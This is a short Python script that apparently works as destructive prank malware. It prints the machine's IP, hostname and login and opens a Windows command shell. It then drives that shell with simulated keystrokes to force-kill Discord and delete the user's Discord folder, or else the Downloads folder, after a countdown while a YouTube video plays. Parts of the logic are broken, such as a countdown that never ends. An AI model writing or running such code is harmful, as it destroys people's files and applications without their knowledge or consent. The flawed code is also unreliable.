import os
import socket
import subprocess
import random
import shutil
import pynput
import time
hostname =socket.gethostname()
ip =socket.gethostbyname(hostname)
warning1 =252
login = os.getlogin()
print(ip , hostname)
input("PAUSED\n")
enter =pynput.keyboard.Key.enter
keyt =pynput.keyboard.Controller()
cmd =subprocess.Popen("cmd.exe /K cd c:/")
time.sleep(0.5)
keyt.type("dir")
keyt.press(enter)
time.sleep(0.5)
keyt.type("dir")
keyt.press(enter)
if os.path.exists("C:/Users/"+login+"/AppData/Roaming/discord/app-1.0.9026"):
 keyt.type("cd C:/Users/"+ login +"/AppData/Roaming/")
 keyt.press(enter)
 time.sleep(1)
 keyt.type(hostname + " ip from running exe: " + ip)
 time.sleep(0.1)
 keyt.press(enter)
 time.sleep(0.5)
 time.sleep(1)
 os.system("start https://www.youtube.com/watch?v=k64Ptubeu_Q&ab_channel=BlackDragonCZ")
 while warning1 >= 0:
  warning1 =warning1 + -1
  time.sleep(1)
  print("folder: " + "C:/Users/"+ login +"/AppData/Roaming/discord")
  print("deletion warning")
  print(str(warning1))
 else:

  os.system("taskkill /F /IM discord.exe")
 keyt.type("del discord")
 keyt.press(enter)
 time.sleep(0.5)
 keyt.type("y")
 keyt.press(enter)
elif os.path.exists("C:/Users/"+ login +"/Downloads"):
 os.system("start https://www.youtube.com/watch?v=k64Ptubeu_Q&ab_channel=BlackDragonCZ")
 while warning1 >= 0:
  warning1 =warning1 + 1
  time.sleep(1)
  print("folder:" + "C:/Users/"+ login +"/Downloads")
  print("deletion warning"+ warning1 * "-" + str(warning1) + " seconds before deletion")
 else:
  keyt.type("del C:/Users/"+ login +"/Downloads")
 keyt.press(enter)
 time.sleep(1)
 keyt.type("y")
 keyt.press(enter)
 #C:\Users\[hidden]\AppData\Roaming\discord\app-1.0.9026
else:
 print("system test complete")
 time.sleep(1)
 exit()
#https://www.youtube.com/watch?v=k64Ptubeu_Q&ab_channel=BlackDragonCZ